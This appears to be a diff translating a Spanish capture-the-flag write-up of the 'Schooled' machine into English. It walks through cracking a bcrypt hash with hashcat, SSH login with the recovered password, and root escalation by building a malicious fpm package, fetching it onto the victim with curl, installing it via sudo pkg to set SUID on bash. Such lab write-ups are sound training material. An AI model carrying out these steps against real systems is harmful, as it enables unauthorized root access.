-- wordlist = wordlist (podria ser rockyou)
-- --user (Flag que le indica a Hashcat que el hash se encuentra en formato [Usuario:Hash])
+Where:
+- -m indicates the mode to use for cracking the hash (bcrypt)
+- -a indicates the attack mode (brute force = 0)
+- hash (name of the file containing the hash)
+- wordlist = wordlist (it could be "rockyou.txt")
+- --user (Flag that tells Hashcat the hash is in the format [User:Hash])
 
-**(Otra Nota interesante)**
-Si ya se ha crackeado un hash con hashcat y queremos ver su resultado en texto plano, podemos usar:
+**(Another interesting note)**
+If a hash has already been cracked with hashcat and we want to see the plaintext result, we can use:
 ```bash
 hashcat -m 3200 --show hash --user
 ```
 ![hash](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/hash.PNG)
 
 
-De esta forma la contraseña del usuario Jamie es: **!QAZ2wsx**
+Thus the password for user Jamie is: **!QAZ2wsx**
 
-Entonces, podemos intentar entrar al sistema por **ssh** utilizando el Usuario de Jamie y la contraseña que hemos crackeado.
+Then, we can try to log in via **ssh** using Jamie's User and the password we cracked.
 
 ```bash
 ssh jamie@[IP]
 ```
 ![userflag](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/userflag.PNG)
 
-**Perfecto!**
+**Perfect!**
 
-Ahora, ya que nos encontramos como el usuario **"Jamie"**, la idea es convertirnos en **root** dentro del sistema.
+Now, since we find ourselves as the user **Jamie**, the idea is to become **root** inside the system.
 
-con el comando:
+with the command:
 
 ```bash
 sudo -l
 ```
 
-Nos es posible ver que tenemos algunos privilegios a nivel de **sudoers**
+It is possible for us to see that we have some privileges at the **sudoers** level.
+
 ![sudoers](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/sudoers.PNG)
 
-Así que vamos a recurrir a un recurso util para situaciones en las que contamos con binarios que podemos ejecutar [https://gtfobins.github.io/]
+So, let's turn to a useful resource for situations where we have binaries we can execute: [https://gtfobins.github.io/]
 
 ![pkgtfobins](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/pkgtfobins.PNG)
 
-**¿Cual es el objetivo?**
-Podemos ver que la explotación de este binario para escalar privilegios utiliza **fpm**, la maquina objetivo no cuenta con este recurso, así que nosotros se lo proporcionaremos.
+**What's the goal?**
+We can see that the privilege escalation exploitation of this binary uses fpm. The target machine doesn't have this resource, so we'll provide it.
 
-Además el campo 'id' es aquel en el que vamos a poder ejecutar comandos, sin embargo nosotros no queremos ejecutar el comando 'id', sino, mas bien queremos ejecutar algo como '/bin/bash'. 
+Also, the 'id' field is where we'll be able to execute commands. However, we don't want to execute the 'id' command, but rather something like '/bin/bash'.
 
-Podemos ver la ruta de este binario mediante:
+We can find the path to this binary by:
 
 ```bash
 ls -l /bin/bash
 ```
 ![SUID](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/SUID.PNG)
 
-Podemos ver que el binario "/usr/local/bin/bash" tiene permisos "755".
+We can see that the binary "/usr/local/bin/bash" has permissions "755".
 
-Nuestro **objetivo** seria que el binario que se encuentra en la ruta: "/usr/local/bin/bash" cuente con permisos **SUID** (4755)
+Our **goal** would be for the binary located at "/usr/local/bin/bash" to have **SUID** permissions (4755).
 
-**¿Que es el permiso SUID?** [https://www.scaler.com/topics/special-permissions-in-linux/]
+**What is the SUID permission?** [https://www.scaler.com/topics/special-permissions-in-linux/]
 
-**Entonces...**
-Nos instalamos **fpm** (En archlinux):
+**So...**
+We will install **fpm** (On Arch Linux):
 
 ```bash
 paru -S fpm
 ```
-Entonces, una vez con fpm en la maquina. Podemos actuar de la siguiente forma, vamos a querer que nuestro comando luzca de esta forma:
+So, once fpm is installed on the machine, we can proceed as follows. We'll want our command to look like this:
 
 ![comandoSUID](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/comandoSUID.PNG)
 
-y luego procedemos a ejecutar:
+And then we proceed to execute:
 
 ```bash
 fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF
 ```
 
-Y se nos creara en nuestro directorio de trabajo un archivo ".txz". Vamos a subir este archivo a la maquina victima y procederemos a instalarlo:
+And a ".txz" file will be created in our working directory. We will upload this file to the victim machine and proceed to install it.
 
-`[Maquina Local]`
+`[Local Machine]`
 ```bash
 python3 -m http.server
 ```
-`[Maquina Victima]`
-`[Ojo, hacerlo en el directorio /tmp]`
+`[Target Machine]`
+`[Note: do this in the /tmp directory]`
 ```bash
 curl -o x-1.0.txz http://[OurIP]/[File]
 ```
-Una vez con el ".txz" en la maquina victima, segun **gtfobins** tendriamos que ejecutar:
+Once we have the ".txz" file on the victim machine, according to gtfobins, we would have to execute:
 
 ```bash
 sudo pkg install -y --no-repo-update ./x-1.0.txz
@@ -572,13 +580,12 @@ sudo pkg install -y --no-repo-update ./x-1.0.txz
 
 ![SUIDaccomp](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/SUIDaccomp.PNG)
 
-"/usr/local/bin/bash" ahora cuenta con permisos **SUID**
+"/usr/local/bin/bash" now has SUID permissions.
 
 ![bashp](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/bashp.PNG)
 
 
-A través del comando **bash -p** se inicia una nueva instancia de la shell Bash. La nueva instancia de Bash heredará los privilegios del propietario del archivo, que en este caso sería **root**
-
+The command bash -p starts a new instance of the Bash shell. The new Bash instance will inherit the privileges of the file owner, which in this case would be root.
 ![pwned.](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/pwned.PNG)
 
 
